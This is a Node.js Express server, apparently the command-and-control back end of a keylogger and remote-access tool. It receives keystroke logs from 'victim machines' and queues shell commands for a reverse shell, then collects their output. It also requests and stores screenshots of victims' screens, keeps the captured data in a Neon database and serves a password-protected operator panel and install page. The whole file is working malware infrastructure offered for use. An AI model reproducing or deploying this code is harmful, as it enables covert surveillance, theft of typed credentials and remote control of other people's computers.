import express from 'express';
const path = require('path');
const fs = require('fs');
const { nanoid } = require('nanoid'); // Para hacer los id de sesion
const WebSocket = require('ws');
const { createServer } = require('http');
const cookieParser = require('cookie-parser');
const { neon } = require("@neondatabase/serverless");

require('dotenv').config()

const { trafficdataRoute } = require('./routes/trafficdataRoute');

const sql = neon(process.env.DATABASE_URL); // Neon database
const app = express();
const server = createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = 3000;
const MAX_AGE = 60000 * 60 * 2; // Cada sesion dura 2 horas
const UPDATE_LOGS_TIME = 60000 * 5; // Cada 5 minutos va a actualizar los logs en neon
var error_logs = '';
let current_logs = null;

var users = new Map([
    ['', {
        session_cookie: '',
        auth: '',
        info: '',
        tries: 0
    }]
]);
var commands = new Map([
    ['', {
        id_pc: '',
        inputs: [''],
        outputs: ['']
    }]
]);
var logs = new Map([
    ['', {
        id_pc: '',
        package: '',
        unix_time: 0,
        description: '',
        screenshot: '',
        state: ''
    }]
]);
var get_screenshot = new Map([
    ['', {
        id_pc: '',
        take_screenshot: false
    }]
]);

let last_logs_sended = structuredClone(logs);

const password = process.env.PASSWORD

/**
 * Main routes:
 *   /
 *   /logs --> Aca se enviar los registros del keylogger (post), se devulve un json con los registros (get)
 *   /computer:/computer --> Parte visual del computador, el computer: va a ser el id de la sesion del computador (get)
 *   /getphoto --> Este endpoint va a pedir una foto (por medio del id del socket) al cliente para colocarla en el log.json (post)
 *   /install --> Este endpoint va a instalar el proyecto en la maquina (get)
 */
app.use(express.json({ limit: '150mb' }));
app.use(cookieParser())
app.use('/login.css', express.static(path.join(__dirname, 'styles', 'login.css/')))
app.use('/menu', express.static(path.join(__dirname, 'styles')))
app.use('/public', express.static(path.join(__dirname, 'public')))
app.use('/menu/images', addSessionMiddleware, express.static(path.join(__dirname, 'images')))
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(trafficdataRoute);
// app.use('/src', express.static(path.join(__dirname, 'src')))

/**
 * Esta conexion va a hacer que el socket servidor modifique la variable de id de socket por la que tiene la 
 * maquina victima, de esta manera se podra hacer el envio de fotos en base 64 al servidor remoto
 */
wss.on('connection', (ws, req) => {
    let id_pc = '';
    console.log('Alguien se conecto al websocket: ');

    ws.on('message', (data) => {

        manejarError('\nMensaje al websocket, con id :' + id_pc);

        let message = JSON.parse(data);

        switch (message.action) {
            case 'add_id_socket':

                id_pc = message.id_pc;

                manejarError('\nMensaje para añadir id pc: ' + id_pc);

                addConnectionWithIdPc(id_pc);

                break;
            case 'photo':
                logs.get(message.id_pc).screenshot = message.screenshot;
                break;
        }
    })

    ws.on('close', () => {

        logs.get(id_pc).state = 'off';
    });

    ws.on('error', (error) => {
        manejarError(error.message);

        logs.get(id_pc).state = 'off';
    })
})

/**
 * Este middleware va a darles cookies a todos los usuarios
 */
app.use('/menu/', addSessionMiddleware)

/**
 * Este endpoint le va a dar informacion sobre el login al usuario
 */
app.get('/info', (req, res) => {
    let session_cookie = req.cookies.session_cookie

    if (!session_cookie) {
        let n = nanoid()

        res.cookie('session_cookie', n, { maxAge: MAX_AGE })
        users.set(n, {
            'session_cookie': n,
            'auth': 'false',
            'info': '',
            'tries': 0
        })
        setTimeout(() => { // Esta parte elimina del archivo users.json el usuario del cookie session cuando el tiempo
            //de max age se haya acabado
            users.delete(n);
        }, MAX_AGE + 5000)

        return res.send(users.get(n));
    }
    // Por si la cookie no existe en la db
    if (!users.has(session_cookie)) return res.clearCookie('session_cookie', session_cookie).redirect('/menu')

    res.send(users.get(session_cookie));
})

app.get('/', (req, res) => {
    res.redirect('/login')
})

app.get('/login', (req, res) => {
    let session_cookie = req.cookies.session_cookie

    if (session_cookie) {
        // Por si la cookie no existe la db
        if (!users.has(session_cookie)) return res.clearCookie('session_cookie', session_cookie).redirect('/menu');

        if (users.get(session_cookie).auth == 'true') return res.redirect('/menu')
    } else return res.redirect('/menu')

    console.log('session_cookie: ', session_cookie)
    res.sendFile(path.join(__dirname, 'html', 'login.html'));
})

app.get('/menu/', (req, res) => {
    console.log('Alguien se ha conectado', '\ncookie: ', req.cookies);
    res.status(200).sendFile(path.join(__dirname, 'html', 'menu.html'));
})

app.get('/menu/install', (req, res) => {
    res.sendFile(path.join(__dirname, 'html', 'install.html'));
})

/**
 * Interface visual de cada computador, el parametro :computer va a ser el id de sesion de cada computador
 */
app.get('/menu/:computer/computer', (req, res) => {
    res.sendFile(path.join(__dirname, 'html', 'computer.html'))
})

/**
 * Esto va a devolver el registro de la maquina solicitada
 */
app.get('/menu/:computer/computer/log', (req, res) => {
    res.send(JSON.stringify(logs.get(req.params.computer)))
})

app.get('/menu/logs', (req, res) => {
    let clone_logs = structuredClone(logs);
    res.send(JSON.stringify(Array.from(clone_logs.entries().map(pc => {
        pc[1].package = '';
        pc[1].screenshot = '';
        return pc[1];
    }))));
})

app.get('/menu/logs-complete', (req, res) => {
    res.send(JSON.stringify(Array.from(logs.values())));
})

/**
 * Este endpoint devolvera el elementro json con los datos de comandos a ejecutar
 */
app.get('/menu/:computer/computer/command', (req, res) => {
    if (commands.has(req.params.computer)) {
        return res.send(commands.get(req.params.computer));
    } else {
        addCommandObject(req.params.computer);
        return res.send('')
    }

})

/**
 * Este endpoint va devolver el ultimo input que contenga el id de sesion que es
 * mencionado en la peticion
 */
app.get('/menu/:computer/computer/command/input', (req, res) => {
    if (commands.has(req.params.computer)) {
        return res.send(commands.get(req.params.computer).inputs[commands.get(req.params.computer).inputs.length - 1]);
    } else {
        addCommandObject(req.params.computer);
        return res.send('')
    }

})

/**
 * Este endpoint va devolver el ultimo input que contenga el id de sesion que es
 * mencionado en el query de la peticion
 */
app.get('/command/input', (req, res) => {

    if (commands.has(req.query.id_pc)) {
        console.log(req.query.id_pc, ', respuesta: ', commands.get(req.query.id_pc).inputs[commands.get(req.query.id_pc).inputs.length - 1]);

        return res.send(commands.get(req.query.id_pc).inputs[commands.get(req.query.id_pc).inputs.length - 1]);
    } else {
        addCommandObject(req.query.id_pc);

        console.log(req.query.id_pc, ', respuesta: ', commands.get(req.query.id_pc).inputs[commands.get(req.query.id_pc).inputs.length - 1]);

        return res.send('')
    }

})

/**
 * Se usa para recibir los errores del servidor
 */

app.get('/error-logs', (req, res) => {
    res.send(error_logs);
})

/**
 * Se va a retornar si se le pide al computador tomar una foto o no
 */
app.get('/getphoto', (req, res) => {

    try {
        return res.send( get_screenshot.get(req.query.id_pc).take_screenshot );
    } catch (error) {
        manejarError(error.message);
        return res.status(404).send('Recurso no encontrado');
    }
})

/**
 * Este post va a recibir la password del login.html y los va a comprobar con el password guardado en
 * memoria ram
 */
app.post('/login', (req, res) => {
    let session_cookie = req.cookies.session_cookie;

    if (!session_cookie) return res.redirect('/menu/');

    // Por si la cookie no existe la db
    if (!users.has(session_cookie)) return res.clearCookie('session_cookie', session_cookie).redirect('/menu');

    // Este try va a retornar el usuario al login si este tiene la info de 
    // Espere 60 segundos dentro del usuario
    if (users.get(session_cookie).tries >= 3) {
        if (users.get(session_cookie).info == 'Espere 60 segundos')
            return res.redirect('/login') // Retornar cuando ya se haya escrito el mensaje
    }

    if (req.body.password == password) { // Si el inicio es exitoso
        users.get(session_cookie).auth = 'true';
        users.get(session_cookie).info = '';
        users.get(session_cookie).tries = 0;

        return res.redirect('/menu')
    }
    else { // Si el inicio es fallido
        // Este try catch es por si el usuario ha superado el intento maximo permitido (3), este 
        // tendra que es esperar un minuto
        users.get(session_cookie).info = 'Contraseña incorrecta';
        users.get(session_cookie).tries = users.get(session_cookie).tries + 1;

        if (users.get(session_cookie).tries >= 3) {
            users.get(session_cookie).info = 'Espere 60 segundos';
            users.get(session_cookie).tries = 3;

            setTimeout(() => {
                users.get(session_cookie).info = '';
                users.get(session_cookie).tries = 0;
            }, 60000)
        }

        res.redirect('/login')
    }
})

/**
 * Este endpoint va a añadir un nuevo objeto log al map logs si no esta creado, y si esta va a actulizar el registro (paquete), la descripcion y
 * el tiempo en unix 
 */
app.post('/logs', (req, res) => {

    if (req.body.id_pc != null) {

        manageGetScreenshot(req.body.id_pc);

        if (logs.has(req.body.id_pc)) { // Si ya tiene el id pc

            let package_existing = logs.entries().find(([id_pc, value]) => id_pc == req.body.id_pc)[1].package;
            let screenshot_existing = logs.entries().find(([id_pc, value]) => id_pc == req.body.id_pc)[1].screenshot;

            logs.set(req.body.id_pc, {
                id_pc: req.body.id_pc,
                package: package_existing + req.body.package,
                unix_time: req.body.unix_time,
                description: req.body.description,
                screenshot: screenshot_existing,
                state: 'on'
            })
        } else { // Si no esta en el map logs
            logs.set(req.body.id_pc, {
                id_pc: req.body.id_pc,
                package: req.body.package,
                unix_time: req.body.unix_time,
                description: req.body.description,
                screenshot: '',
                state: 'on'
            })
        }

        res.status(200).send();

    } else { // Si el id viene null
        res.status(404).send(nanoid());
    }

})

/**
 * En este endpoint se va a actualizar la screenshot
 */
app.post('/putphoto', (req, res) => {

    try {
        logs.get(req.body.id_pc).screenshot = req.body.screenshot;

        get_screenshot.set(req.body.id_pc, {
            id_pc: req.body.id_pc,
            take_screenshot: false
        });
    } catch (error) {
        manejarError(error.message);
    }
    res.send(200)
})

/**
 * En este endpoint se va a enviar el resquest con el id de la sesion, para encontrar
 * el id del socket y posteriormente enviarle la peticion de screenshot a la
 * maquina victima
 */
app.post('/getphoto', (req, res) => {

    try {
        get_screenshot.set(req.body.id_pc, { // Esto es para la nueva version de la aplicacion que no va a requerir websockets
            id_pc: req.body.id_pc,
            take_screenshot: true
        });
    } catch (error) {
        manejarError(error.message);
    }

    try {
        wss.clients.forEach(client => {
            client.send(JSON.stringify({
                id_pc: req.body.id_pc,
                action: 'getphoto'
            }));
        });
    } catch (error) {
        manejarError(error.message);
    }
    res.send('');
})

/**
 * Este endpoint va a decirle a la maquina indicada que ejecute el comando contenido en la request
 */
app.post('/menu/:computer/computer/command/input', (req, res) => {
    if (commands.has(req.params.computer)) {
        commands.get(req.params.computer).inputs.push(req.body.command);
        return res.send('');
    } else {
        addCommandObject(req.params.computer);
        return res.send('');
    }

})

/**
 * Este endpoint va a limpiar el registro de comandos en la reverse shell, segun el id de sesion especificado
 */
app.post('/menu/:computer/computer/clear-command', (req, res) => {
    if (commands.has(req.params.computer)) {
        commands.get(req.params.computer).inputs = [''];
        commands.get(req.params.computer).outputs = [''];

        return res.send('');
    } else {
        addCommandObject(req.params.computer);
        return res.send('');
    }

})

/**
 * Este endpoint va a actualizar el ultimo output con el enviado por la maquina
 */
app.post('/command/output', (req, res) => {
    let command_object_selected = commands.get(req.body.id_pc);

    if (commands.has(req.body.id_pc)) {
        if (command_object_selected.inputs.length > command_object_selected.outputs.length) {
            return res.send(commands.get(req.body.id_pc).outputs.push(req.body.output));
        }
    }

    return res.send('')
})

server.listen(PORT, () => {
    console.log(`Servidor levantado en http://localhost:${PORT}`)
})


initLogs();

setInterval(updateLogs, UPDATE_LOGS_TIME);


async function addSessionMiddleware(req, res, next) {
    // console.log('Middleware para todas las rutas de menu y login')
    let session_cookie = req.cookies.session_cookie

    if (!session_cookie) {
        let n = nanoid()
        res.cookie('session_cookie', n, { maxAge: MAX_AGE })
        users.set(n, {
            'session_cookie': n,
            'auth': 'false',
            'info': '',
            'tries': 0
        })
        setTimeout(() => { // Esta parte elimina del archivo users.json el usuario del cookie session cuando el tiempo
            //de max age se haya acabado
            users.delete(n);
        }, MAX_AGE + 5000)
        return res.redirect('/login')

    } else { //En caso de que el usuario tenga una session_cookie
        // Por si la cookie no existe la db
        if (!users.has(session_cookie)) return res.clearCookie('session_cookie', session_cookie).redirect('/menu')

        if (users.get(session_cookie).auth == 'true') next() // Retorna al endpoint pedido
        else return res.redirect('/login') // Retorna al login si el usuario no esta autorizado
    }
}

function manejarError(message) {
    error_logs = error_logs.concat(`\n[${(new Date(Date.now())).toUTCString()}]: ${message}`);
}

function addConnectionWithIdPc(id_pc) {
    if (logs.get(id_pc)) {
        logs.get(id_pc).state = 'on';
    } else {
        logs.set(id_pc, {
            id_pc: id_pc,
            package: '',
            unix_time: Date.now(),
            description: '',
            screenshot: '',
            state: 'on'
        })
    }
}

function addCommandObject(id_pc) {
    commands.set(id_pc, {
        id_pc: id_pc,
        inputs: [''],
        outputs: ['']
    })
}
async function requestSQL(strings, ...values) {
    const result = await sql.query(strings, values);
    return result;
}

function initLogs() {
    requestSQL("select * from logs").then(res => {
        res.forEach(l => {
            l.unix_time = Number(l.unix_time); // Si no se parsea a Number la fecha sera dada en string, y al momento de mostrarlo en el front
            // va a dar el error invalid date
            logs.set(l.id_pc, l);
        })

        last_logs_sended = structuredClone(logs); // Para iniciar los ultimos logs enviados cuando la variable log se inicializa
    });

}

function manageGetScreenshot(id_pc) {
    if (get_screenshot.has(id_pc)) {
        get_screenshot.set(id_pc, {
            id_pc: id_pc,
            take_screenshot: get_screenshot.get(id_pc).take_screenshot
        });
    }else {
        get_screenshot.set(id_pc, {
            id_pc: id_pc,
            take_screenshot: false
        });
    }

}

function updateLogs() {
    current_logs = structuredClone(logs);

    current_logs.entries().forEach(async ([id_pc, v]) => {
        console.log('logs length: ', logs.size)

        if (id_pc == null) return;

        const { query, values } = setQueryAndValue(v);

        try {
            const result = await sql.query(query, values);

        } catch (error) {
            console.error('Error en upsert:', error);
        }
    })

    last_logs_sended = structuredClone(current_logs);
}

function setQueryAndValue(log_object) {
    let properties = ['unix_time', 'description', 'screenshot', 'state'];
    let values = [];
    let values_$ = [`$1`, `$2`, `$3`, `$4`, `$5`, `$6`];
    let current_value_$ = 1;
    let query = `
        INSERT INTO logs(id_pc, package, unix_time, description, screenshot, state) 
        VALUES($1, $2, $3, $4, $5, $6)
    `;

        if ( last_logs_sended.has(log_object.id_pc) ) {
            values = [log_object.id_pc, log_object.package.replace(last_logs_sended.has(log_object.id_pc) == true ? last_logs_sended.get(log_object.id_pc).package : '', '')];

            query = `
                UPDATE logs
                SET package = logs.package || ${values_$[current_value_$++]}`;

            properties.forEach(p => {
                
                if ( log_object[p] == last_logs_sended.get(log_object.id_pc)[p] ) {
                    return;
                } else {

                    query = query.concat(`, ${p} = ${values_$[current_value_$++]}`);
                    values.push( log_object[p] );
                }
            });

            query = query.concat(`
                WHERE id_pc = $1
                `);


            return {
                query,
                values
            }

        } else {
            return {
                query,
                values : [
                    log_object.id_pc,          // $1
                    log_object.package,         // $2
                    log_object.unix_time,    // $3
                    log_object.description,  // $4
                    log_object.screenshot,   // $5
                    log_object.state
                ]
            }
        }

}
